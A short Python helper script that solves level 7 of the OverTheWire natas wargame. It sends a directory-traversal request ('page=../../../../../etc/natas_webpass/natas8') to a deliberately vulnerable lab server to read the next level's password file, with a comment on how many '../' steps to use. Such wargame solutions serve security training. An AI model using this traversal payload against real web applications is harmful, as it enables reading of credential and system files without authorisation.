"""
Help script to resolve natas challenge #7
"""
import requests
import json

level = 'natas7'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
A comment in the code reveals the location of the files where the passwords
are stored. Use directory traversal again to do a LFI.
NOTE: the number of levels to go up to the file-system root usually varies.
I always try with five, as there is usually no side effects of going up too
many times. 
"""
response = requests.get(url + '/index.php?page=../../../../../etc/natas_webpass/natas8', auth=auth)
print(response.text)
